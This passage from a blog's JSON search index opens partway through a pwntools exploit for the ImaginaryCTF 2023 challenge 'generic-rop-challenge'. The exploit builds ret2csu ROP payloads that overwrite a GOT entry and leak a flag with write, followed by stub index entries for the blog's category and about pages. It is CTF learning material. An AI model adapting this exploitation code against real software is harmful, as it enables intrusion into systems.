libc.symbols[\u0026#34;write\u0026#34;] write_fptr = elf.bss(0x600) log.info(f\u0026#34;setup write function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(write_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;write\u0026#34;])) # write(1, flag_addr, 0x100) payload = ret2csu(1, flag_addr, 0x100, write_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.interactive() ","date":"25 July 2023","permalink":"/posts/imaginaryctf-2023/pwn/generic-rop-challenge/","section":"My Average Blog","summary":"ARM64 ROP with \u003ccode\u003eret2csu\u003c/code\u003e","title":"generic-rop-challenge"},{"content":"","date":"25 July 2023","permalink":"/categories/imaginaryctf-2023/","section":"Categories","summary":"","title":"ImaginaryCTF 2023"},{"content":"Trying to learn pwn and reversing.\n","date":"1 January 0001","permalink":"/about/","section":"d0UBleW's Blog","summary":"Trying to learn pwn and reversing.","title":"About"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]